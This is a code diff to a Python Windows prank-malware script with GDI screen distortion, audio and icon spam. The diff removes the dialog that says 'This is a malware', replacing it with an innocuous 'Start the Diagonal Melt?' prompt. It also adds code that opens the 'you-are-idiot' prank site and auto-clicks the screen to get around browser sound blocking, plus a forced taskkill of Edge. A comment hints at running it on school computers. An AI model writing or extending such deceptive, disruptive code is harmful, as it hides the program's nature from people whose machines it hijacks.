@@ -9,7 +9,21 @@ import keyboard
 import sys
 import tkinter as tk
 from tkinter import messagebox
+import webbrowser 
+import pyautogui
 from playsound import playsound
+
+def open_the_chaos():
+    # 1. Open the browser
+    webbrowser.open("https://you-are-idiot.github.io/")
+    
+    # 2. Wait 2 seconds for the page to load (School internet might be slow)
+    time.sleep(2)
+    
+    # 3. The "Auto-Click" - Browsers block sound until a user clicks the page
+    # This clicks the center of the screen to 'unmute' the chaos
+    width, height = pyautogui.size()
+    pyautogui.click(width // 2, height // 2)
 
 # --- Setup GDI ---
 user32 = ctypes.windll.user32
@@ -119,6 +133,7 @@ def on_esc():
     stop_flag.set()
     user32.ShowCursor(True) # BRING CURSOR BACK
     user32.InvalidateRect(0, 0, 1) # Refresh screen
+    os.system("taskkill /F /IM msedge.exe /T")
     print("\n[!] Restoring System...")
     os._exit(0)
     
@@ -126,7 +141,7 @@ if __name__ == '__main__':
     root = tk.Tk()
     root.withdraw()
     
-    if messagebox.askyesno("Warning", "This is a malware, are you sure running it?\n\nPress ESC to stop."):
+    if messagebox.askyesno("DIAGONAL DESTRUCTION", "Start the Diagonal Melt?\n\nPress ESC to stop."):
         keyboard.add_hotkey('esc', on_esc)
         
         threading.Thread(target=audio_engine, daemon=True).start()
@@ -135,6 +150,7 @@ if __name__ == '__main__':
         threading.Thread(target=blue_square_clones, daemon=True).start()
         threading.Thread(target=icon_spam_trail, daemon=True).start()
         gdi32.BitBlt(hdc, 5, 5, width, height, hdc, 0, 0, 0x00EE0086)
+        open_the_chaos()
 
         keyboard.wait('esc')
         on_esc()
